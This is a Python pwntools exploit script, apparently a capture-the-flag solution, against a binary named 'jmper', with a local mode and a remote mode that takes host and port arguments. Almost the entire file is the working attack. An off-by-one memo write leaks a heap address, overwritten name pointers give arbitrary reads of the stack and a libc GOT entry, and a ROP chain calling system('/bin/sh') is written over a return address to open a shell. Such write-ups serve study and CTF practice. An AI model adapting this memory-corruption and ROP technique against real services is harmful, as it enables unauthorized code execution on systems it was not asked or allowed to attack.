#!/usr/bin/env python2
# -*- coding:utf-8 -*-
from pwn import *
import os, sys

# switches
DEBUG = 1

# modify this
elf = ELF('./jmper')

if DEBUG:
    io = process('./jmper')
else:
    io = remote(sys.argv[1], int(sys.argv[2]))

if DEBUG: context(log_level='debug')
# define symbols and offsets here

# simplified r/s function
def ru(delim):
    return io.recvuntil(delim)

def rn(count):
    return io.recvn(count)

def ra(count):      # recv all
    buf = ''
    while count:
        tmp = io.recvn(count)
        buf += tmp
        count -= len(tmp)
    return buf

def sl(data):
    return io.sendline(data)

def sn(data):
    return io.send(data)

def info(string):
    return log.info(string)

def dehex(s):
    return s.replace(' ','').decode('hex')

# define interactive functions here
def add():
	ru('6. Bye :)')
	sl('1')

def add_name(ID, name):
	ru('6. Bye :)')
	sl('2')
	ru(':')
	sl(str(ID))
	ru(':')
	sl(name)

def add_memo(ID, memo):
	ru('6. Bye :)')
	sl('3')
	ru(':')
	sl(str(ID))
	ru(':')	
	sn(memo)

def show_name(ID):
	ru('6. Bye :)')
	sl('4')
	ru(':')
	sl(str(ID))

def show_memo(ID):	
	ru('6. Bye :)')
	sl('5')
	ru(':')
	sl(str(ID))

# define exploit function here
def pwn():
	add()
	add()
	add_memo(0, 'x' * 33)
	show_memo(0)	
	ru('x' * 32)
	heap_addr = u64(rn(4).ljust(8, '\x00'))
	heap_base = heap_addr & ~0xfff
 	info('heap_base : ' + hex(heap_base))	
	
	#leak stack
	heap_t = heap_base + 0x128
	add_name(0, p64(heap_t))
	show_name(1)

	stack_addr = u64(rn(6).ljust(8, '\x00'))
	info('stack_addr : ' + hex(stack_addr))
	
	#leak libc base
	add_name(0, p64(0x601fb0))
	show_name(1)
	libc_addr = u64(rn(6).ljust(8, '\x00'))
	libc = ELF('./libc-64')
	libc_base = libc_addr - libc.symbols['__libc_start_main']
	system_addr = libc_base + libc.symbols['system']
	bin_sh = libc_base + libc.search('/bin/sh\x00').next()
	info('system : ' + hex(system_addr))
	info('binsh_addr : ' + hex(bin_sh))
	pop_rdi = 0x400cc3

	#edit ret_addr
	add_name(0, p64(stack_addr - 0xd8))
	add_name(1, p64(pop_rdi) + p64(bin_sh) + p64(system_addr))	
	
	#trigger shell
	for i in range(0, 29):
		add()
	io.interactive()
	return

if __name__ == '__main__':
	pause()
	pwn()
